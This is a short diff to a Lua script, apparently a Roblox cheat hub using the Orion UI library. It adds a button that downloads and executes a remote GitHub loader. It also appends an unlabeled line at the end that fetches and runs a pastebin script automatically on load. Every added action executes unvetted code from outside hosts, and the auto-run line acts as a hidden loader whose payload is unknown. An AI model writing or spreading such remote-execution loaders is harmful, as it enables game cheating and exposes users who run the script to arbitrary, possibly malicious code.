@@ -55,9 +55,16 @@ loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imalwibest/Imalwibes
 })
 
 Tab:AddButton({
-	Name = "Danimals Adventure World",
+	Name = "Danimals Adventure World 1",
 	Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/Danimals", true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Danimals Adventure World 2",
+	Callback = function()
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("16733634144")
   	end    
 })
 
@@ -125,3 +132,5 @@ loadstring(game:HttpGet(('https://pastefy.app/9g67yG0v/raw'),true))()
 })
 
 OrionLib:Init()
+
+loadstring(game:HttpGet("https://pastebin.com/0amJEJX5"))()
